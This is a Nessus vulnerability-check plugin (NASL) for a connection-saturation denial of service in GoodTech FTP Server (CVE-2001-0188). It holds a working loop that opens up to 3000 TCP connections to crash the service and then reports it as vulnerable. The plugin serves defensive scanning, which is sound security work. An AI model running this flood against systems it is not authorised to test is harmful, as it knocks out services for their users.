#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10690);
 script_version ("$Revision: 1.27 $");
 script_cve_id("CVE-2001-0188");
 script_bugtraq_id(2270);
 script_osvdb_id(13803);
 
 script_name(english:"GoodTech FTP Server Connection Saturation DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote ftp server is prone to denial of service attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running GoodTech FTP Server for Windows. 

It was possible to disable the remote FTP server by connecting to it
about 3000 separate times.  If the remote server is running from
within [x]inetd, this is a feature and the FTP server should
automatically be back in a couple of minutes.  An attacker may use
this flaw to prevent this service from working properly." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/Jan/329" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to a version of GoodTech FTP server later than 3.0.1.2.1.0." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:C");

 script_set_attribute(attribute:"plugin_publication_date", value: "2001/06/15");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/01/22");
 script_cvs_date("$Date: 2016/10/10 15:57:06 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"connections attempts overflow");
 script_category(ACT_FLOOD);
 script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencie("ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");

port = get_ftp_port(default: 21);

b = get_ftp_banner(port: port);
if ( "GoodTech" >!< b ) exit(0);

  for(i=0;i<3000;i=i+1)
  {
   soc = open_sock_tcp(port);
   if(!soc)
   {
    if (i == 0) exit(1, "Cannot connect to TCP port "+port+".");
    if (service_is_dead(port: port) > 0)
      security_warning(port);
    i = 3001;
    exit(0);
   }
   close(soc);
  }
